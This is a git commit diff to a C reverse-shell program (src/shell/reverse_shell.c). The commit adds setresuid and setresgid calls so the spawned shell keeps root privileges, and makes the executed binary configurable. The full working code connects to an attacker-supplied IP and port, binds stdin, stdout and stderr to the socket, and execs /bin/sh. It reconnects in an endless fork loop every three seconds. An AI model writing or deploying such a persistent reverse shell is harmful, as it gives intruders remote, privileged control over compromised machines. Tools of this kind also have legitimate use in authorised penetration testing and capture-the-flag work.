4f85b5af47079cfccd2aa8e37a28e43d987d45de
leommxj <leommxj@gmail.com>
2021-07-18 14:06:38 +0800

    1.add setresuid&setresgid to shells

--- src/shell/reverse_shell.c
+++ src/shell/reverse_shell.c
@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/socket.h>
@@ -8,8 +9,10 @@
  
 char ip_addr[16] = "127.0.0.1";  
 char port[6] = "3343";
+char exe_path[255] = "/bin/sh";
+char exe_arg0[50] = "sh";
 
-int spwan(){
+void spawn() {
     int socket_fd;
     struct sockaddr_in addr;
 
@@ -17,40 +20,43 @@ int spwan(){
     addr.sin_addr.s_addr = inet_addr(ip_addr);
     addr.sin_port = htons(atoi(port));
 
-    socket_fd = socket(AF_INET,SOCK_STREAM,0);
-    connect(socket_fd,(struct sockaddr *)&addr,sizeof(addr));
-  
-    dup2(socket_fd,0); // STDIN
-    dup2(socket_fd,1); // STDOUT
-    dup2(socket_fd,2); // STDERR
-  
-    execl("/bin/sh","sh",NULL,NULL,NULL);
+    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr));
+
+    dup2(socket_fd, 0); // STDIN
+    dup2(socket_fd, 1); // STDOUT
+    dup2(socket_fd, 2); // STDERR
+
+    if (geteuid() == 0){
+        setresuid(0, 0, 0);
+        setresgid(0, 0, 0);
+    }
+    execl(exe_path, exe_arg0, NULL, NULL, NULL);
 }
 
-int main (int argc, char **argv)
-{
-    if(argc>=2 && strlen(argv[1])<16 ){
+int main (int argc, char **argv){
+    if(argc>=2 && strlen(argv[1])<16 ) {
         memset(ip_addr, 0, 16);
         memcpy(ip_addr, argv[1], strlen(argv[1]));
     }
 
-    if(argc==3 && strlen(argv[2])<6){
+    if(argc==3 && strlen(argv[2])<6) {
         memset(port, 0, 6);
         memcpy(port, argv[2], strlen(argv[2]));
     }
   
-    while(1){
+    while(1) {
     	pid_t pid = fork();
-    	if(pid < 0){
+    	if(pid < 0) {
     		exit(0);
     	}
-    	if(pid == 0){
-    	    spwan();
+    	if(pid == 0) {
+    	    spawn();
 	    exit(0);
     	}
-	int _;
-	wait(&_);
-	sleep(3);
+	    int _;
+	    wait(&_);
+	    sleep(3);
     }
 
     return 0;
